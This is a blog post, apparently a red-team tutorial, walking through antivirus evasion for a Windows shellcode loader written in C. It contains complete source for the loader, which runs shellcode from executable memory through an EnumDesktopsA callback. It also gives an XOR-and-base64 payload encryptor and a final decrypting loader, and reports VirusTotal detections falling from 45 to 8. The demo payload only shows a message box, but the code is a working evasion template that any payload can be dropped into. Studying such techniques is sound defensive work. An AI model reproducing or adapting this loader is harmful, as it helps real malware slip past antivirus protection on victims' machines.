---
layout: post
title: Malware AV evasion trick. Encrypt and encode payload
---

Today, we will write a simple malware in C++ that will launch our payload: `meow-meow` messagebox. Then try to reduce the number of AV engines that will detect our malware.     

### practical example

First of all, create simple C++ malware (`hack0.c`):     

```cpp
#include <windows.h>

int main() {
  unsigned char my_payload[] = 
  "\xfc\x48\x81\xe4\xf0\xff\xff\xff\xe8\xd0\x00\x00\x00\x41"
  "\x51\x41\x50\x52\x51\x56\x48\x31\xd2\x65\x48\x8b\x52\x60"
  "\x3e\x48\x8b\x52\x18\x3e\x48\x8b\x52\x20\x3e\x48\x8b\x72"
  "\x50\x3e\x48\x0f\xb7\x4a\x4a\x4d\x31\xc9\x48\x31\xc0\xac"
  "\x3c\x61\x7c\x02\x2c\x20\x41\xc1\xc9\x0d\x41\x01\xc1\xe2"
  "\xed\x52\x41\x51\x3e\x48\x8b\x52\x20\x3e\x8b\x42\x3c\x48"
  "\x01\xd0\x3e\x8b\x80\x88\x00\x00\x00\x48\x85\xc0\x74\x6f"
  "\x48\x01\xd0\x50\x3e\x8b\x48\x18\x3e\x44\x8b\x40\x20\x49"
  "\x01\xd0\xe3\x5c\x48\xff\xc9\x3e\x41\x8b\x34\x88\x48\x01"
  "\xd6\x4d\x31\xc9\x48\x31\xc0\xac\x41\xc1\xc9\x0d\x41\x01"
  "\xc1\x38\xe0\x75\xf1\x3e\x4c\x03\x4c\x24\x08\x45\x39\xd1"
  "\x75\xd6\x58\x3e\x44\x8b\x40\x24\x49\x01\xd0\x66\x3e\x41"
  "\x8b\x0c\x48\x3e\x44\x8b\x40\x1c\x49\x01\xd0\x3e\x41\x8b"
  "\x04\x88\x48\x01\xd0\x41\x58\x41\x58\x5e\x59\x5a\x41\x58"
  "\x41\x59\x41\x5a\x48\x83\xec\x20\x41\x52\xff\xe0\x58\x41"
  "\x59\x5a\x3e\x48\x8b\x12\xe9\x49\xff\xff\xff\x5d\x49\xc7"
  "\xc1\x00\x00\x00\x00\x3e\x48\x8d\x95\x1a\x01\x00\x00\x3e"
  "\x4c\x8d\x85\x25\x01\x00\x00\x48\x31\xc9\x41\xba\x45\x83"
  "\x56\x07\xff\xd5\xbb\xe0\x1d\x2a\x0a\x41\xba\xa6\x95\xbd"
  "\x9d\xff\xd5\x48\x83\xc4\x28\x3c\x06\x7c\x0a\x80\xfb\xe0"
  "\x75\x05\xbb\x47\x13\x72\x6f\x6a\x00\x59\x41\x89\xda\xff"
  "\xd5\x4d\x65\x6f\x77\x2d\x6d\x65\x6f\x77\x21\x00\x3d\x5e"
  "\x2e\x2e\x5e\x3d\x00";

  unsigned int my_payload_len = sizeof(my_payload);
  LPVOID mem = VirtualAlloc(NULL, sizeof(my_payload), MEM_COMMIT, PAGE_EXECUTE_READWRITE);
  RtlMoveMemory(mem, my_payload, sizeof(my_payload));
  EnumDesktopsA(GetProcessWindowStation(), (DESKTOPENUMPROCA)mem, NULL); 
 
  return 0;
}

```

For simplicity, as you can see, we use running shellcode [via EnumChildWindows](https://cocomelonc.github.io/malware/2022/07/13/malware-injection-21.html) logic.     

Compile it:     

```bash
x86_64-w64-mingw32-gcc -O2 hack0.c -o hack.exe -I/usr/share/mingw-w64/include/ -s -ffunction-sections -fdata-sections -Wno-write-strings -fno-exceptions -fmerge-all-constants -static-libstdc++ -static-libgcc
```

![compile]({{ site.baseurl }}/images/2/2023-03-08_20-55.png)     

check it:     

![demo]({{ site.baseurl }}/images/2/2023-03-08_20-56.png)    

Let's go to upload this "malware" to VirusTotal:      

![vt]({{ site.baseurl }}/images/2/2023-03-08_19-57.png)      

[https://www.virustotal.com/gui/file/657ff9b6499f8eed373ac61bf8fc98257295869a833155f68b4d68bb6e565ca1/detection](https://www.virustotal.com/gui/file/657ff9b6499f8eed373ac61bf8fc98257295869a833155f68b4d68bb6e565ca1/detection)     

**As you can see, 45 of 69 AV engines indicate it as malicious**      

### encryption and encoding

Then, create C++ script for encrypting our payload via `XOR` algorithm + `base64` encode result:     

```cpp
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <stdint.h>
#include <windows.h>
#include <wincrypt.h>
#pragma comment (lib, "Crypt32.lib")

// key for XOR decrypt
char my_secret_key[] = "mysupersecretkey";

// decrypt deXOR function
void XOR(char * data, size_t data_len, char * key, size_t key_len) {
  int j;
  j = 0;
  for (int i = 0; i < data_len; i++) {
    if (j == key_len - 1) j = 0;
    data[i] = data[i] ^ key[j];
    j++;
  }
}

int main() {
  unsigned char my_payload[] = 
  "\xfc\x48\x81\xe4\xf0\xff\xff\xff\xe8\xd0\x00\x00\x00\x41"
  "\x51\x41\x50\x52\x51\x56\x48\x31\xd2\x65\x48\x8b\x52\x60"
  "\x3e\x48\x8b\x52\x18\x3e\x48\x8b\x52\x20\x3e\x48\x8b\x72"
  "\x50\x3e\x48\x0f\xb7\x4a\x4a\x4d\x31\xc9\x48\x31\xc0\xac"
  "\x3c\x61\x7c\x02\x2c\x20\x41\xc1\xc9\x0d\x41\x01\xc1\xe2"
  "\xed\x52\x41\x51\x3e\x48\x8b\x52\x20\x3e\x8b\x42\x3c\x48"
  "\x01\xd0\x3e\x8b\x80\x88\x00\x00\x00\x48\x85\xc0\x74\x6f"
  "\x48\x01\xd0\x50\x3e\x8b\x48\x18\x3e\x44\x8b\x40\x20\x49"
  "\x01\xd0\xe3\x5c\x48\xff\xc9\x3e\x41\x8b\x34\x88\x48\x01"
  "\xd6\x4d\x31\xc9\x48\x31\xc0\xac\x41\xc1\xc9\x0d\x41\x01"
  "\xc1\x38\xe0\x75\xf1\x3e\x4c\x03\x4c\x24\x08\x45\x39\xd1"
  "\x75\xd6\x58\x3e\x44\x8b\x40\x24\x49\x01\xd0\x66\x3e\x41"
  "\x8b\x0c\x48\x3e\x44\x8b\x40\x1c\x49\x01\xd0\x3e\x41\x8b"
  "\x04\x88\x48\x01\xd0\x41\x58\x41\x58\x5e\x59\x5a\x41\x58"
  "\x41\x59\x41\x5a\x48\x83\xec\x20\x41\x52\xff\xe0\x58\x41"
  "\x59\x5a\x3e\x48\x8b\x12\xe9\x49\xff\xff\xff\x5d\x49\xc7"
  "\xc1\x00\x00\x00\x00\x3e\x48\x8d\x95\x1a\x01\x00\x00\x3e"
  "\x4c\x8d\x85\x25\x01\x00\x00\x48\x31\xc9\x41\xba\x45\x83"
  "\x56\x07\xff\xd5\xbb\xe0\x1d\x2a\x0a\x41\xba\xa6\x95\xbd"
  "\x9d\xff\xd5\x48\x83\xc4\x28\x3c\x06\x7c\x0a\x80\xfb\xe0"
  "\x75\x05\xbb\x47\x13\x72\x6f\x6a\x00\x59\x41\x89\xda\xff"
  "\xd5\x4d\x65\x6f\x77\x2d\x6d\x65\x6f\x77\x21\x00\x3d\x5e"
  "\x2e\x2e\x5e\x3d\x00";

  DWORD my_payload_len = sizeof(my_payload) - 1;
  DWORD out_len = 0;

  printf("original:\n");
  for (size_t i = 0; i < my_payload_len; i++) {
    printf("\\x%02x", my_payload[i]);
  }
  printf("\n\n");

  XOR((char *) my_payload, my_payload_len, my_secret_key, sizeof(my_secret_key));

  printf("xored:\n");
  for (size_t i = 0; i < my_payload_len; i++) {
    printf("\\x%02x", my_payload[i]);
  }
  printf("\n\n");

  CryptBinaryToString((BYTE*)my_payload, my_payload_len, CRYPT_STRING_BASE64 | CRYPT_STRING_NOCRLF, NULL, &out_len);

  // allocate memory for the base64-encoded shellcode
  char* encoded = (char*)malloc(out_len);
  if (!encoded) {
    printf("error: failed to allocate memory for base64-encoded shellcode.\n");
    return 1;
  }

  // call CryptBinaryToString again to perform the encoding
  if (!CryptBinaryToString((BYTE*)my_payload, my_payload_len, CRYPT_STRING_BASE64 | CRYPT_STRING_NOCRLF, encoded, &out_len)) {
    printf("error: failed to base64-encode shellcode.\n");
    return 1;
  }

  printf("base64-encoded shellcode:\n%s\n", encoded);
  free(encoded);
  
  return 0;
}
```

For correctness, we print original, `XOR`ed and `base64` encoded payload.     

Compile our encryptor:    

```bash
x86_64-w64-mingw32-gcc -O2 enc.c -o enc.exe -I/usr/share/mingw-w64/include/ -s -ffunction-sections -fdata-sections -Wno-write-strings -fno-exceptions -fmerge-all-constants -static-libstdc++ -static-libgcc -lcrypt32
```

![enc]({{ site.baseurl }}/images/2/2023-03-08_21-00.png)     

![encdemo]({{ site.baseurl }}/images/2/2023-03-08_21-01.png)     

### decode and decrypt

So, for running shellcode, we "reverse" our logic:

Let's say we have `base64` encoded shellcode:    

```cpp
unsigned char meow_payload[] = "kTHykYCajYyNs3JldCo0OD0rIiM4VKAWLeggBUoj7it1Rzv+IkVMO+4RIls8ZNIzJzRCvDhUst9ZAg5nWEskuKR0MnSxh58hJDJMLf85RUfmO089cbVM+OXrcmV0I+C5GRY7dKA1TPgte0wh/ytFMGypkCk4mrtNJOhG7TxqszRcsDtEsMkzsqxuM2S1U4UMnEc/djxBejZcsgezLFUh8i1dOnSgA0wy7m86WzDgJWUkeKNLMe52+y1ioiQsKj0nNCMyLTE8Mykt4J5FNTmamTU4Ki9OLflhjCqNmos2LL6seXN1cFs6/vB5c2V0VSn06FxydXAtQ7ok2TfmImyarNaZbl96JMjV8N7vmqEj5r1FRXUJeuWJkxBmySJnGQoTbSAy/Kqapz4ADAVIGQ4KDkx5TiteSyxOZQ==";
unsigned int meow_len = sizeof(meow_payload);
```

At the first step, we `base64` decode this string to bytes:     

```cpp
int decodeBase64(const BYTE * src, unsigned int srcLen, char * dst, unsigned int dstLen ) {
  DWORD outLen;
  BOOL fRet;

  outLen = dstLen;
  fRet = CryptStringToBinary( (LPCSTR) src, srcLen, CRYPT_STRING_BASE64, (BYTE * )dst, &outLen, NULL, NULL);	
  if (!fRet) outLen = 0;  // failed	
  return(outLen);
}

//....

unsigned char exec_mem[my_payload_len];
decodeBase64((const BYTE *)meow_payload, meow_len, (char *) exec_mem, meow_len);
```

at the result, we have a `XOR`ed shellcode. Then, at the next step, we de`XOR` our bytes to get the original shellcode:    

```cpp
// key for XOR decrypt
char my_secret_key[] = "mysupersecretkey";

// decrypt deXOR function
void XOR(char * data, size_t data_len, char * key, size_t key_len) {
  int j;
  j = 0;
  for (int i = 0; i < data_len; i++) {
    if (j == key_len - 1) j = 0;
    data[i] = data[i] ^ key[j];
    j++;
  }
}
//....

XOR((char *) exec_mem, my_payload_len, my_secret_key, sizeof(my_secret_key));
```

Of course, we use the same secret key for `XOR` and "de`XOR`" our payload.     

So, the full source code of our "malware" is looks like this:      

```cpp
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <stdint.h>
#include <windows.h>
#include <wincrypt.h>
#pragma comment (lib, "Crypt32.lib")

int decodeBase64(const BYTE * src, unsigned int srcLen, char * dst, unsigned int dstLen ) {
  DWORD outLen;
  BOOL fRet;

  outLen = dstLen;
  fRet = CryptStringToBinary( (LPCSTR) src, srcLen, CRYPT_STRING_BASE64, (BYTE * )dst, &outLen, NULL, NULL);	
  if (!fRet) outLen = 0;  // failed	
  return(outLen);
}

// key for XOR decrypt
char my_secret_key[] = "mysupersecretkey";

// decrypt deXOR function
void XOR(char * data, size_t data_len, char * key, size_t key_len) {
  int j;
  j = 0;
  for (int i = 0; i < data_len; i++) {
    if (j == key_len - 1) j = 0;
    data[i] = data[i] ^ key[j];
    j++;
  }
}

int main() {
  unsigned int my_payload_len = 313;
  unsigned int out_len = 0;

  unsigned char meow_payload[] = "kTHykYCajYyNs3JldCo0OD0rIiM4VKAWLeggBUoj7it1Rzv+IkVMO+4RIls8ZNIzJzRCvDhUst9ZAg5nWEskuKR0MnSxh58hJDJMLf85RUfmO089cbVM+OXrcmV0I+C5GRY7dKA1TPgte0wh/ytFMGypkCk4mrtNJOhG7TxqszRcsDtEsMkzsqxuM2S1U4UMnEc/djxBejZcsgezLFUh8i1dOnSgA0wy7m86WzDgJWUkeKNLMe52+y1ioiQsKj0nNCMyLTE8Mykt4J5FNTmamTU4Ki9OLflhjCqNmos2LL6seXN1cFs6/vB5c2V0VSn06FxydXAtQ7ok2TfmImyarNaZbl96JMjV8N7vmqEj5r1FRXUJeuWJkxBmySJnGQoTbSAy/Kqapz4ADAVIGQ4KDkx5TiteSyxOZQ==";
  unsigned int meow_len = sizeof(meow_payload);
  printf("base64-encoded shellcode:\n%s\n", meow_payload);

  unsigned char exec_mem[my_payload_len];
  decodeBase64((const BYTE *)meow_payload, meow_len, (char *) exec_mem, meow_len);

  printf("xored:\n");
  for (size_t i = 0; i < my_payload_len; i++) {
    printf("\\x%02x", exec_mem[i]);
  }
  printf("\n\n");

  XOR((char *) exec_mem, my_payload_len, my_secret_key, sizeof(my_secret_key));

  for (size_t i = 0; i < my_payload_len; i++) {
    printf("\\x%02x", exec_mem[i]);
  }

  LPVOID mem = VirtualAlloc(NULL, my_payload_len, MEM_COMMIT, PAGE_EXECUTE_READWRITE);
  RtlMoveMemory(mem, exec_mem, my_payload_len);
  EnumDesktopsA(GetProcessWindowStation(), (DESKTOPENUMPROCA)mem, NULL);
  
  return 0;
}
```

### demo

Let's go to see everything in action. Compile our final "malware":     

```bash
x86_64-w64-mingw32-gcc -O2 hack.c -o hack.exe -I/usr/share/mingw-w64/include/ -s -ffunction-sections -fdata-sections -Wno-write-strings -fno-exceptions -fmerge-all-constants -static-libstdc++ -static-libgcc -lcrypt32
```

![hack]({{ site.baseurl }}/images/2/2023-03-08_21-03.png)    

Then, run it at the victim's machine (`Windows 10 x64`):     

![hack.exe]({{ site.baseurl }}/images/2/2023-03-08_21-05.png)    

As you can see, everything is worked perfectly! =^..^=

Let's go to upload this `hack.exe` to VirusTotal:     

![vtfinal]({{ site.baseurl }}/images/2/2023-03-08_21-07.png)     

[https://www.virustotal.com/gui/file/f670cad1158c9bce595327edd77548997b39749abe8cb01d2a4c6ef1e135e7a1/details](https://www.virustotal.com/gui/file/f670cad1158c9bce595327edd77548997b39749abe8cb01d2a4c6ef1e135e7a1/details)      

As you can see, we have reduced the **number of AV engines which detect our malware from 45 to 8!**    

I hope this post spreads awareness to the blue teamers of this interesting encrypting technique, and adds a weapon to the red teamers arsenal. Also this post is useful for entry level cybersec specialists and for professionals.     

Thanks for your time happy hacking and good bye!   
*PS. All drawings and screenshots are Cyber 5W*    
